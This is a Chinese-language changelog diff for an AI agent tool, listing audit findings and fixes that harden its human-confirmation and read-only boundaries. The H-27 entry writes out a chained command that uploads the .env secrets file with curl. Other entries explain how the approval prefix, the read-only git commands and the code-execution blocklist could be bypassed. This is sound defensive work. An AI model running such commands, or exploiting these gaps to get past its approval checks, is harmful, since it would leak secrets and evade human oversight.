@@ -65,6 +65,55 @@
 - [v1.1 · 2026-08-20 · 真实工具落地](#v11-2026-08-20)
 - [v1.0 · 2026-08-19 · 初版](#v10-2026-08-19)
 
+## [未发布] · 2026-09-27
+
+> 这一批只有一件事：**把"人点头"和"只读"这两条边界补成真的**。
+> 来源是对 `tools/` 扩展面的独立对抗性审计（5 条），逐条在现码上复现后立项：
+> `docs/design/CONFIRM-BOUNDARY.md`（H-27 ~ H-31）。
+> 全量断言随平台浮动，**以 `python test_all.py` 的实际输出为准，本文不写死数字**。
+
+### 🛡️ 安全
+
+- **H-27 前缀免确认被 shell 组合符绕过（一次点头 = 任意命令）**：`command_prefix` 只取前
+  两个空白 token、不做 shell 解析，而 `_prefix_auto_approved` 据此免确认 ⇒ 用户批准一次
+  `git status` 之后，`git status && curl … -d @.env` 的前缀同样是 `git status`，
+  **CONFIRM 闸门与工具层 approval hook 两个出口同时放行**（而 `ace_execpolicy` 对同一条
+  命令的判定是 `prompt` / `shell_syntax` —— 本该问人）。修在判据处：含 shell 组合 /
+  替换 / 重定向字符的命令返回 `""`（= 不参与免确认，fail-close）；单条命令的前缀语义不变。
+- **H-28 确认框不再让人盲批 + 文件不再交给 ShellExecute**：`edit_file` 的确认预览与授权
+  identity 都取 `command or code`，而它的参数是 `path` ⇒ 人看到的是
+  「'edit_file' 需要用户逐次确认: 」后面**没有对象**（H-09 的"授权绑对象"对它也完全不
+  生效）。新增 `confirm_subject()`：`terminal_exec` 逐字不变，其余按
+  `path`/`dest`/`url`/`target`/`name` 给摘要。另外 `edit_file` **不再把文件交给
+  `os.startfile`**（那走的是"该后缀的关联动作"，而 `.py` 的关联动作就是**运行**它，
+  `.py` 又恰好不在后缀名单里）：补名单是治标（那份名单自己写着"天生补不全"，还会连带
+  禁掉编辑 `.py` 的正当用途）⇒ 文件只交给已知编辑器（`code` → 记事本回退），没有就退回
+  可点击链接；目录仍交给资源管理器。
+- **H-29 只读工具的"只读"要真的是只读**：`git branch` 的名字只读、动作不读
+  （`-D` 删分支 / `-m` 改名 / `-f` 强移上游），而它是 `PERM_READ`、不在 CONFIRM_TOOLS、
+  也不建快照 ⇒ 只读会话下能删引用。改为只放行**列举旗标**。
+  `ls`/`dir` 两个分支此前**连 `sensitive_target` 都不调**（只有 `cat` 分支调），于是同一份
+  情报 `cat` 挡、`ls` 放 —— 新增 `sensitive_dir_listing_reason()`：复用同一个 `_match`，
+  只按**类别**收窄（凭据 / 私钥 / 敏感目录 / agent 自身状态），系统目录仍可列 ——
+  SEC-006 的"目录名单可越界"原样保留。网络路径（UNC / `\\?\`）此前不受任何出网闸门
+  约束，而 `Path.exists()` 那一步**就已经完成一次 SMB 认证** ⇒ 新增
+  `network_path_reason()` 并判在 `exists()` **之前**（ls/dir、open_file、edit_file）。
+- **H-30 `code_execute` 没有真边界时不再静默退回宿主**：唯一的进程内闸门是 AST 黑名单，
+  而那份名单自己写着"枚举不可能闭合"（实测 `io.open(...)` 的读写都放行，同价的
+  `open`/`os`/`pathlib` 被拦）；`code_execute` 又是 `PERM_WRITE` 且**不在**
+  CONFIRM_TOOLS（不逐次问人）—— 没有边界、也没有人。现在与"job 档拿不到执行器就 503"
+  "冻结发行直接 501"同一立场：docker 沙箱与 Go 执行器都不可用时 **503**，消息里给三条
+  出路；要显式接受无边界请配 `sandbox.code_execute_host`（默认 `false`）。
+
+### 🧪 测试
+
+- **H-31 前端集成测试不再写开发者真实仓库**：它起真引擎却不传 `--project-root`，而
+  `AceClient` 的 cwd 就是仓库根 ⇒ 一次 `cd frontend && npm test` 会留下未跟踪的
+  `demo_notes.md`（mock 剧本的 file_write）、往真实 `.ace_sessions/` 写会话日志、改写真实
+  `.agent_memory.json`、生成 `.guardian/snapshots/`。`e2e/mcp_probe.py` 与 Python 侧
+  test_all 的 H-26 守卫都是对的，只有这个入口漏了。现在给引擎一个临时 project-root，
+  并新增一条与 H-26 同尺子的断言：跑完整组，仓库自己的 `.ace_sessions/` 一条不涨。
+
 ## [v3.44.0] · 2026-09-26
 
 > 这一版只有一件事：**把执行层交给别人的 agent 用** —— ACE 从"自己干活的 agent"变成任何
